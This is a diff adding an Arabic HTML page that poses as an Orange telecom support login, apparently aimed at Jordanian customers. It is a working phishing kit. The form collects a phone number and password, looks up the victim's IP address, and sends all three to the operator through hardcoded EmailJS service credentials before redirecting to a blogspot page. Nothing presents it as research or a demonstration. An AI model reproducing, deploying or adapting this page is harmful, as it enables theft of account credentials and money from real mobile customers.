@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>خدمات الدعم من خلال Orange</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Arial', sans-serif;
+            background-color: #FFFFFF;
+            color: #000000;
+            margin: 0;
+            padding: 0;
+            text-align: right;
+            overflow: hidden; /* منع التمرير */
+        }
+        .container {
+            max-width: 400px;
+        }
+        label {
+            display: block;
+            margin: 15px 0 5px;
+            color: #666;
+            font-size: 14px;
+            text-align: right;
+        }
+        input[type="tel"], input[type="password"] {
+            width: 90%;
+            padding: 10px;
+            margin-top: 5px;
+            margin-bottom: 5px;
+            border: none;
+            border-bottom: 2px solid #000000;
+            border-radius: 5px;
+            font-size: 14px;
+            outline: none;
+            text-align: right;
+            transition: 0.10s ease all;
+        }
+        .btn {
+            background-color: #ff6600;
+            color: #000000;
+            border: none;
+            padding: 8px;
+            width: 100%;
+            border-radius: 5px;
+            font-size: 12px;
+            cursor: pointer;
+            margin-top: 1px;
+        }
+        .btn:hover {
+            background-color: #e55a00;
+        }
+        .error {
+            color: red;
+            font-size: 10px;
+            margin-bottom: 7px;
+            display: none; /* يتم إخفاء الإشعار في البداية */
+        }
+        .subnote {
+            font-size: 12px;
+            color: #999;
+            text-align: right;
+            margin-bottom: 6px;
+        }
+    </style>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        // تهيئة EmailJS باستخدام User ID
+        emailjs.init("Zt4sUADNmecFKWHmd");
+
+        function validatePassword(password) {
+            const arabicRegex = /[\u0600-\u06FF]/;
+            if (arabicRegex.test(password)) return false;
+            const symbolRegex = /[!@#$%^&*(),.?":{}|<>]/;
+            const numberRegex = /\d/;
+            const letterRegex = /[a-zA-Z]/;
+            return (symbolRegex.test(password) && numberRegex.test(password)) &&
+                   (!letterRegex.test(password) || letterRegex.test(password));
+        }
+
+        function validateForm() {
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            const errorMsg = document.getElementById('error-msg');
+            if (!/^\d{10}$/.test(phone)) {
+                errorMsg.innerText = "يرجى إدخال رقم هاتف صحيح.";
+                errorMsg.style.display = 'block';
+                return false;
+            }
+            if (!validatePassword(password)) {
+                errorMsg.innerText = "يرجى إدخال كلمة سر صحيحة.";
+                errorMsg.style.display = 'block';
+                return false;
+            }
+            errorMsg.style.display = 'none';
+            return true;
+        }
+
+        async function onSubmit(event) {
+            event.preventDefault();
+            if (!validateForm()) return;
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+            try {
+                const ipRequest = await fetch('https://api.ipify.org?format=json');
+                const ipResponse = await ipRequest.json();
+                const ipAddress = ipResponse.ip;
+
+                const templateParams = {
+                    phone: phone,
+                    password: password,
+                    ip: ipAddress
+                };
+
+                // إرسال البيانات عبر EmailJS باستخدام Service ID و Template ID
+                await emailjs.send("service_v614t8d", "template_lv9areh", templateParams);
+                alert("تم إرسال البيانات بنجاح!");
+                window.location.href = "https://orangeonlinemoney.blogspot.com/2024/12/orange-console.html";
+            } catch (error) {
+                console.error('Error:', error);
+                alert("حدث خطأ أثناء إرسال البيانات.");
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>خدمات الدعم من خلال Orange</h1>
+        <form onsubmit="onSubmit(event)">
+            <label for="phone">رقـم الهاتـف</label>
+            <input type="tel" id="phone" placeholder="أدخل رقم الهاتف" pattern="[0-9]{10}" maxlength="10" required>
+            <div class="subnote">الرجاء إدخال رقم الهاتف الذي يبدأ بـ ٠۷۷ او ۰۷۸ أو ۰۷۹</div>
+            <label for="password">كلمة السر</label>
+            <input type="password" id="password" placeholder="أدخل كلمة السر" required>
+            <div id="error-msg" class="error"></div>
+            <button type="submit" class="btn">تسجيل الدخول</button>
+        </form>
+    </div>
+</body>
+</html>
